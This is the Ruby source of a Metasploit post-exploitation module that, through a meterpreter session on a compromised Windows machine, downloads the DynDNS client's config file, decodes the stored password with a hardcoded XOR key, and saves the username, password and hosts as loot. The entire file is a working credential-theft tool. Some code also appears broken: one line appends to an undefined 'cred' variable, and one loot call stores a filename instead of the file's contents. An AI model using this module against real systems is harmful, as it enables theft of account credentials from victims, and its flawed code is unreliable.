##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather DynDNS Client Password Extractor',
        'Description' => %q{
          This module extracts the username, password, and hosts for DynDNS version 4.1.8.
          This is done by downloading the config.dyndns file from the victim machine, and then
          automatically decode the password field. The original copy of the config file is also
          saved to disk.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Shubham Dawra <shubham2dawra[at]gmail.com>', # SecurityXploded.com
          'sinn3r', # Lots of code rewrite
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_fs_stat
            ]
          }
        }
      )
    )
  end

  #
  # Search for the config file.
  # Return the config file path, otherwise nil to indicate nothing was found
  #
  def get_config_file
    config_paths = [
      'C:\\ProgramData\\Dyn\\Updater\\config.dyndns', # Vista
      'C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\config.dyndns' # XP and earlier
    ]

    # Return the first match
    config_paths.each do |path|
      return path if exists?(path)
    end

    nil
  rescue StandardError
    nil
  end

  #
  # Download the config file, and then load it up in memory.
  # Return the content.
  #
  def load_config_file(config_file)
    f = session.fs.file.new(config_file, 'rb')
    content = ''
    content << f.read until f.eof?
    p = store_loot('dyndns.raw', 'text/plain', session, 'dyndns_raw_config.dyndns')
    vprint_good("Raw config file saved: #{p}")
    return content
  end

  #
  # Parse the data
  # Return: Hash { :username, :pass, :hosts }
  #
  def parse_config(content)
    # Look at each line for user/pass/host
    user = content.scan(/Username=([\x21-\x7e]+)/)[0][0]
    pass = content.scan(/Password=([\x21-\x7e]+)/)[0][0]
    host = content.scan(/Host\d=([\x21-\x7e]+)/)[0]

    # Let's decode the pass
    pass = decode_password(pass) if !pass.nil?

    # Store data in a hash, save it to the array
    # Might contain nil if nothing was regexed
    config_data = {
      user: user,
      pass: pass,
      hosts: host
    }

    return config_data
  end

  #
  # Decode the password
  #
  def decode_password(pass)
    pass = [pass].pack('H*')
    s = ''
    c = 0

    pass.each_byte do |a1|
      a2 = 't6KzXhCh'[c, 1].unpack('c')[0].to_i
      s << (a1 ^ a2).chr
      c = ((c + 1) % 8)
    end

    return s
  end

  #
  # Print results and storeloot
  #
  def do_report(data)
    tbl = Rex::Text::Table.new(
      'Header' => 'DynDNS Client Data',
      'Indent' => 1,
      'Columns' => ['Field', 'Value']
    )

    creds = Rex::Text::Table.new(
      'Header' => 'DynDNS Credentials',
      'Indent' => 1,
      'Columns' => ['User', 'Password']
    )

    # Store username/password
    cred << [data[:user], data[:pass]]

    if !creds.rows.empty?
      p = store_loot(
        'dyndns.creds',
        'text/csv',
        session,
        creds.to_csv,
        'dyndns_creds.csv',
        'DynDNS Credentials'
      )
      print_status("Parsed creds stored in: #{p}")
    end

    # Store all found hosts
    hosts = data[:hosts]
    hosts.each do |host|
      tbl << ['Host', host]
    end

    print_status(tbl.to_s)

    if !tbl.rows.empty?
      p = store_loot(
        'dyndns.data',
        'text/plain',
        session,
        tbl.to_csv,
        'dyndns_data.csv',
        'DynDNS Client Data'
      )
      print_status("Parsed data stored in: #{p}")
    end
  end

  #
  # Main function, duh
  #
  def run
    # Find the config file
    config_file = get_config_file
    if config_file.nil?
      print_error('No config file found, will not continue')
      return
    end

    # Load the config file
    print_status('Downloading config.dyndns...')
    content = load_config_file(config_file)

    if content.empty?
      print_error('Config file seems empty, will not continue')
      return
    end

    # Get parsed data
    config = parse_config(content)

    # Store data
    do_report(config)
  end
end
